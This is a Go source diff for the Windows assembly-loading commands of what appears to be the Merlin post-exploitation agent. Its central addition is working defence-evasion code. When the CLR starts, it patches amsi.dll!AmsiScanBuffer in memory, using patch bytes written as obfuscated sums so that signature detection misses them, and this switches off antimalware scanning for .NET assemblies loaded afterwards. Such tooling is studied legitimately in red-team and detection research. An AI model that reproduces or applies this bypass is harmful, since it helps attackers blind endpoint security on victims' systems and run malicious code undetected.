@@ -1,3 +1,4 @@
+//go:build windows
 // +build windows
 
 package commands
@@ -17,6 +18,7 @@ import (
 	// Internal
 	"github.com/Ne0nd0g/merlin-agent/cli"
 	"github.com/Ne0nd0g/merlin-agent/core"
+	"github.com/Ne0nd0g/merlin-agent/os/windows/pkg/evasion"
 )
 
 // runtimeHost is the main object used to interact with the CLR to load and invoke assemblies
@@ -28,6 +30,8 @@ var assemblies = make(map[string]assembly)
 // redirected tracks if STDOUT/STDERR have been redirected for the CLR so that they can be captured
 // and send back to the server
 var redirected bool
+
+var patched bool
 
 // assembly is a structure to represent a loaded assembly that can subsequently be invoked
 type assembly struct {
@@ -81,13 +85,29 @@ func startCLR(runtime string) (results jobs.Results) {
 	}
 
 	// Load the CLR and an ICORRuntimeHost instance
+	if runtime == "" {
+		runtime = "v4"
+	}
 	runtimeHost, err = clr.LoadCLR(runtime)
 	if err != nil {
 		results.Stderr = fmt.Sprintf("there was an error calling the startCLR function:\n%s", err)
 		cli.Message(cli.WARN, results.Stderr)
 		return
 	}
-	results.Stdout = fmt.Sprintf("the %s CLR runtime was successfully loaded", runtime)
+	results.Stdout = fmt.Sprintf("\nThe %s .NET CLR runtime was successfully loaded", runtime)
+
+	// Patch AMSI ScanBuffer
+	if !patched {
+		out, err := evasion.Patch("amsi.dll", "AmsiScanBuffer", &[]byte{0xB2 + 6, 0x52 + 5, 0x00, 0x04 + 3, 0x7E + 2, 0xc2 + 1})
+		if err != nil {
+			results.Stderr = fmt.Sprintf("there was an error patching the amsi!ScanBuffer function: %s", err)
+		} else {
+			results.Stdout += fmt.Sprintf("\n%s", out)
+			patched = true
+		}
+
+	}
+
 	cli.Message(cli.SUCCESS, results.Stdout)
 	return
 }
@@ -109,9 +129,9 @@ func loadAssembly(args []string) (results jobs.Results) {
 
 		// Load the v4 runtime if there are not any runtimes currently loaded
 		if runtimeHost == nil {
-			r := startCLR("")
-			if r.Stderr != "" {
-				return r
+			results = startCLR("")
+			if results.Stderr != "" {
+				return
 			}
 		}
 
@@ -126,13 +146,15 @@ func loadAssembly(args []string) (results jobs.Results) {
 		// Load the assembly
 		a.methodInfo, err = clr.LoadAssembly(runtimeHost, assembly)
 		if err != nil {
+			// HRESULT: 0x8007000b COR_E_BADIMAGEFORMAT
+			// https://referencesource.microsoft.com/#mscorlib/system/__hresults.cs,7041cd5c9aa1948b,references
 			results.Stderr = fmt.Sprintf("there was an error calling the loadAssembly function:\n%s", err)
 			cli.Message(cli.WARN, results.Stderr)
 			return
 		}
 
 		assemblies[a.name] = a
-		results.Stdout = fmt.Sprintf("Successfully loaded %s into the default AppDomain", a.name)
+		results.Stdout += fmt.Sprintf("\nSuccessfully loaded %s into the default AppDomain", a.name)
 		cli.Message(cli.SUCCESS, results.Stdout)
 		return
 	}
